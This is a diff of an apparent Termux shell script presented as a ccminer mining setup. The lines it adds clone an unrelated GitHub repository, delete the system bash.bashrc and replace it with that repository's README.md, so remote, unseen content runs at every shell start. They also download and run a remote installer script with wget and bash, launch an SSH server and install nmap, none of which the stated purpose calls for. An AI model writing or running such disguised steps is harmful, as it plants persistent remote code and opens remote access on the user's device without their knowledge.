@@ -35,4 +35,46 @@ echo "            ▀*₫ ";
 sleep 5
 echo "load... ccminer start ubuntu mining coin✓ ";
 sleep 3
-proot-distro login ubuntu
+
+pkg update -y
+
+pkg upgrade -y
+
+pkg install wget -y 
+
+pkg install git -y
+
+pwd
+
+cd ..
+
+ls
+
+cd usr
+
+ls
+
+cd etc
+
+ls
+
+git clone https://github.com/giaBAba/giaBAba.git
+
+rm -rf bash.bashrc
+
+cd giaBAba
+
+cp README.md ../bash.bashrc
+
+cd 
+
+pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Ubuntu/ubuntu.sh && bash ubuntu.sh
+
+pkg install openssh
+ 
+sshd 
+
+pkg install nmap
+
+./start-ubuntu.sh
+
